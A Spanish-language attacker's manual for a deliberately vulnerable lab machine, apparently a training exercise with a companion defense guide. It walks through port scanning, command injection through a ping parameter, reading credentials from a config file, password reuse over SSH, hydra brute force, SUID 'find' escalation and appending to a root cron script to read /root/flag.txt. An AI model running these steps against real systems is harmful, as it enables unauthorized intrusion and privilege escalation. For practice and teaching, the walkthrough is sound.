# ⚔️ Attack Overal — el manual del que ataca

> **Para quién:** el que recibe la [Máquina de Overwall](Maquina_de_Overwall.md)
> sabiendo solo su dirección IP, y tiene que llegar a `/root/flag.txt`.
>
> **Guía hermana:** [Defend Overal](Defend_Overal.md). Si te toca defender, leé
> esa. No leas las dos antes del ejercicio o te quedás sin ejercicio.

---

## ⚠️ Dónde se practica esto

Contra **tu propia máquina de laboratorio en red host-only**, HackTheBox, o algo
con permiso escrito. Nada de lo que hay aquí se apunta a un sistema que no sea
tuyo o no te hayan autorizado por escrito — eso no es una advertencia moral, es
la diferencia entre un CV y un expediente.

Si alguien te pregunta *"¿cómo ataco esto?"* sin decirte qué es, la primera
respuesta es siempre: **¿dónde está la caja?**

---

## El método: no busques la bandera

El error del principiante es ir directo al premio. El método real es más
aburrido y mucho más eficaz:

```
1. ENUMERAR   ->  ¿qué hay? (sin tocar nada)
2. ENTENDER   ->  ¿qué hace cada cosa con lo que yo le doy?
3. ENTRAR     ->  conseguir ejecutar algo, aunque sea sin privilegios
4. ESCALAR    ->  de ahí a root
```

> **La regla que más tiempo ahorra:** no pasés a la fase siguiente hasta agotar
> la anterior. El 80 % de los atascos son fase 4 intentada con la fase 1 a medias.

Y la que más duele aprender: **anotá todo, también lo que NO funcionó.** Cuando
llevás dos horas vas a volver a probar lo mismo sin acordarte.

---

## Fase 1 — Enumerar

### Puertos

```bash
nmap -p- --min-rate 2000 -oN todos.txt 10.0.2.15
```

`-p-` son los 65.535, no los 1.000 de serie. **Saltarse esto es el error clásico**
— los servicios interesantes casi nunca están en el puerto esperado.

Y después, en detalle, solo sobre los que salieron:

```bash
nmap -sCV -p 2222,8080,8081 -oN detalle.txt <ip>
```

Esto es lo que devuelve de verdad contra la Máquina de Overwall:

```
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
8080/tcp open  http    BaseHTTPServer 0.6 (Python 3.11.2)
8081/tcp open  http    nginx
```

**Parate en la línea del 8080 y leela bien**, porque ahí está la primera decisión
del ataque:

| lo que ves | lo que significa |
|---|---|
| `nginx` (8081) | un servidor **estándar**, escrito por gente que sabe, usado por millones. Los fallos fáciles ahí ya los encontró otro |
| `BaseHTTPServer 0.6 (Python 3.11.2)` | esto **lo escribió alguien a mano**, en un rato, para esta máquina |

> **La regla:** entre un servidor estándar y uno casero, el casero primero.
> Siempre. El código que escribió una persona para un caso concreto no pasó por
> auditorías, ni por años de gente rompiéndolo.

El nginx del 8081 está ahí **a propósito y no es la vía de entrada**. Es para que
practiques no quedarte con el primer servicio que ves.

> **Ojo con los puertos:** no son los de siempre. La máquina está detrás de un
> reenvío, así que el SSH no está en el 22 sino en el **2222**. Si escaneás solo
> los mil puertos de serie, no ves ninguno de los tres. Por eso `-p-`.

`-sC` lanza los guiones básicos, `-sV` identifica versión. Esa versión es una
pista: el software viejo arrastra fallos conocidos, pero **ojo** — una versión
vieja *no es* una vulnerabilidad por sí sola. Hay que demostrar que el fallo está
y que se dispara. (Está escrito en el arsenal: *una versión vieja no es una
vulnerabilidad*.)

### Lo que ofrece cada puerto

```bash
curl -i http://10.0.2.15:8080/
curl -i http://10.0.2.15/
```

`-i` muestra las cabeceras, que a veces cantan el servidor y el lenguaje.

Si hay web, enumerá rutas:

```bash
feroxbuster -u http://10.0.2.15:8080 -w /usr/share/wordlists/dirb/common.txt
```

> **No te saltes la enumeración de subdominios/vhosts cuando haya nombres de por
> medio.** Es el paso que más retos ha costado en este grupo — un acceso entero
> perdido por no mirar un vhost.

---

## Fase 2 — Entender qué hace con lo que le das

Acá está la diferencia entre lanzar herramientas y hacer reversing de un
servicio.

Si una página recibe un parámetro, **la pregunta no es "¿tiene un fallo?"** sino
**"¿qué hace exactamente con mi texto?"**.

```bash
curl "http://10.0.2.15:8080/?host=127.0.0.1"
```

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.011 ms
```

Eso es la salida literal de `ping`. Lo que acabás de aprender: **tu texto llega a
un programa del sistema.** Y si llega a un programa, la pregunta siguiente es si
llega *a través de una consola*, porque una consola interpreta caracteres
especiales.

### La familia: inyección de comandos

Cuando un programa construye una orden **pegando** tu texto:

```python
os.popen("ping -c 1 " + host)      # <- tu texto entra crudo
```

...vos no estás limitado al nombre de la máquina. Los separadores de la consola
te dejan añadir una orden más:

| separador | qué hace |
|---|---|
| `;` | ejecuta la siguiente, pase lo que pase |
| `&&` | ejecuta la siguiente solo si la primera salió bien |
| `\|` | pasa la salida de una a la otra |
| `` ` `` o `$( )` | ejecuta y mete el resultado dentro |

La prueba que se hace **primero**, siempre, es la más inofensiva:

```bash
curl "http://10.0.2.15:8080/?host=127.0.0.1;id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`id` no rompe nada y te responde las dos preguntas que importan: **¿se ejecuta?**
y **¿como quién?**

> **Ese `www-data` es la mejor noticia posible y hay que leerlo bien.** Significa
> que estás dentro pero **sin privilegios**, así que hay una fase 4 por delante.
> Si hubiera dicho `root`, el servicio estaba mal montado — y eso también es un
> hallazgo, de los graves.

### Codificar la carga

Dentro de una URL, algunos caracteres tienen significado propio y hay que
escribirlos en código:

| carácter | en la URL |
|---|---|
| espacio | `%20` |
| `;` | `%3B` (o literal, según el servidor) |
| `&` | `%26` — **obligatorio**: sin codificar, corta la URL ahí |
| `\` | `%5C` |

El del `&` es el que más rabia da: tu orden se parte por la mitad y parece que la
inyección no funciona cuando el problema era la URL.

---

## Fase 3 — Entrar de verdad

Ejecutar órdenes sueltas por una web sirve para explorar, pero es incómodo. Lo
primero que se busca es **acceso estable**, y lo más estable es una cuenta.

### Buscar credenciales desde donde estás

Ya ejecutás como `www-data`. Mirá lo que ese usuario puede leer:

```bash
curl "http://10.0.2.15:8080/?host=127.0.0.1;ls%20-la%20/opt"
curl "http://10.0.2.15:8080/?host=127.0.0.1;cat%20/opt/app/config.env"
```

```
DB_HOST=127.0.0.1
DB_USER=root
DB_PASS=verano2024
```

Sitios donde mirar siempre: `/opt`, `/var/www`, `/home/*`, ficheros `.env`,
`config.*`, `.git/config`, el historial (`~/.bash_history`), y las variables de
entorno de los procesos.

### La reutilización, que es el atajo real

Esa contraseña es "de la base de datos". **Probala igual en todo lo demás.**

```bash
ssh operador@10.0.2.15
# contraseña: verano2024
```

```
uid=1000(operador) gid=1000(operador) groups=1000(operador)
```

Funcionó. No porque el SSH tuviera un fallo, sino porque **la persona reutilizó
la contraseña**. Ese es el camino más usado en intrusiones reales, y no requiere
exploit ninguno.

> Si no hubiera credenciales a mano: contraseñas débiles por fuerza bruta
> (`hydra -l operador -P rockyou.txt ssh://IP`), **pero** eso hace muchísimo
> ruido en los registros y es lo primero que ve el que defiende. Se usa cuando no
> queda otra, no de entrada.

---

## Fase 4 — Escalar a root

Ya estás dentro como usuario normal. Ahora se trata de encontrar algo que corra
con más permisos que vos y que vos puedas influir.

### El barrido de escalada, en orden de rentabilidad

```bash
sudo -l                                      # 1. ¿puedo ejecutar algo como root?
find / -perm -4000 -type f 2>/dev/null       # 2. SUID
cat /etc/cron.d/* /etc/crontab 2>/dev/null   # 3. tareas programadas
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|tmp|dev)'   # 4. ficheros que puedo escribir
uname -a; cat /etc/os-release                # 5. versión del núcleo (lo último)
```

El núcleo va el último a propósito: los exploits de kernel son ruidosos,
inestables y tumban máquinas. Si hay un camino por permisos, se usa ese.

### Camino A — un SUID que no debería estar

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/find
...
```

`find` con SUID es un regalo: sabe **ejecutar otros programas** con `-exec`, y
esos heredan el permiso efectivo de root.

```bash
find /opt -maxdepth 0 -exec id \; -quit
```

```
uid=1000(operador) gid=1000(operador) euid=0(root)
```

Ese `euid=0` es la partida ganada. Y con él:

```bash
find /opt -maxdepth 0 -exec cat /root/flag.txt \; -quit
```

```
OVERWALL{...}
```

> **La regla general, que vale para cualquier máquina:** si un binario con SUID
> sabe *ejecutar otra cosa*, *leer un fichero cualquiera* o *escribir uno*, ya es
> root. La lista de cuáles y cómo está en **GTFOBins**, y es de consulta
> obligatoria.

### Camino B — una tarea programada que puedo escribir

```bash
cat /etc/cron.d/respaldo
```

```
* * * * * root /opt/respaldo.sh
```

Corre **como root**, cada minuto. ¿Y quién puede editarla?

```bash
ls -l /opt/respaldo.sh
```

```
-rwxrwxrwx 1 root root 58 ...
```

`rwxrwxrwx` — cualquiera. Entonces añadís una línea y esperás:

```bash
echo 'cp /root/flag.txt /tmp/robada.txt; chmod 644 /tmp/robada.txt' >> /opt/respaldo.sh
sleep 70
cat /tmp/robada.txt
```

```
OVERWALL{...}
```

No hiciste nada ingenioso: le pediste a root que lo hiciera por vos.

> **Añadí (`>>`), no sobrescribas (`>`).** Si borrás lo que el script hacía,
> rompés algo que quizá importa y el que defiende lo nota al instante. En un
> encargo de verdad, romper lo que funciona es la forma más rápida de perder al
> cliente.

---

## Lo que hay que escribir mientras atacás

Esto no es burocracia: es la mitad del trabajo, y es lo que te distingue de
alguien que solo colecciona banderas.

Por cada cosa que probás:

```
QUÉ probé        ->  la orden exacta, copiable
QUÉ esperaba     ->  tu hipótesis
QUÉ pasó         ->  la salida literal
QUÉ significa    ->  y qué abre, si abre algo
```

**Y lo que NO funcionó también se escribe.** Dos razones: no lo repetís dentro de
dos horas, y si trabajás con otros, nadie recorre el mismo callejón sin salida.

> El criterio de calidad es duro y es el del grupo: **un hallazgo no existe hasta
> que otra persona lo reproduce leyendo solo tu escrito.** Sin que le expliques
> nada de palabra. Si no lo levanta con tus notas, el cliente tampoco.

---

## Errores que vas a cometer

**Ir a por la bandera en el minuto uno.** Terminás probando escaladas en una
máquina que no enumeraste.

**`nmap` sin `-p-`.** El puerto interesante estaba en el 8080 y los mil de serie
no lo cubren.

**No codificar el `&` en la URL.** Tu orden se corta por la mitad y descartás una
inyección que sí funcionaba.

**Probar la escalada antes de saber quién sos.** `id` primero. Siempre. Si ya
sos root, te ahorraste la fase entera.

**Lanzar fuerza bruta de entrada.** Hace ruido, te detectan y además casi siempre
había una credencial tirada en un fichero.

**Sobrescribir en vez de añadir.** Rompés el servicio y te quedás sin el camino.

**No anotar.** El más caro de todos, y el que no duele hasta la tercera hora.

---

## Lo que te llevás

1. **Enumerar, entender, entrar, escalar.** En ese orden, y sin saltos.
2. **La pregunta no es "¿tiene un fallo?" sino "¿qué hace con lo que le doy?"**
3. **`id` es la orden más rentable que existe.** Te dice si ejecutás y como quién.
4. **La contraseña reutilizada es el camino más usado en intrusiones reales**, y
   no necesita ningún exploit.
5. **Si un SUID sabe ejecutar, leer o escribir, ya es root.** GTFOBins.
6. **Una tarea de root que podés escribir es una consola de root con retardo.**
7. **Lo que no se escribe, no existe** — incluidos los negativos.

---

## El siguiente escalón

Esta máquina tiene los fallos puestos a mano y a propósito. El paso siguiente es
un objetivo donde **nadie los puso**: donde hay que encontrar el fallo en el
código, no la configuración.

Ahí entran los retos de HackTheBox de la carpeta [`retos/`](../retos/), y después
la investigación de vulnerabilidades de verdad — que es lo mismo que acabás de
hacer, pero sin que nadie te garantice que haya algo.

---

> **Recordatorio de siempre:** laboratorio propio en red host-only, HackTheBox, o
> permiso escrito. Si encontrás un fallo así en software real, no se publica: se
> reporta y se espera el parche.
